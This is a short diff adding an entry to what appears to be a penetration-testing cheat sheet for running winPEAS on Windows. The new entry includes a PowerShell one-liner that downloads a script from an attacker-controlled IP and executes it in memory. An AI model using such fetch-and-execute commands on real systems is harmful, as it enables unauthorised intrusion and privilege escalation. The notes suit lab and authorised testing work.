@@ -17,3 +17,9 @@
 ### Then
 
     PowerSharpPack -winPEAS
+
+### 6: Invoke-WinPEAS https://gist.github.com/S3cur3Th1sSh1t/d14c3a14517fd9fb7150f446312d93e0#file-invoke-winpeas-ps1
+
+    iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/Invoke-winPEAS.ps1')
+
+    Invoke-winPEAS >> .out
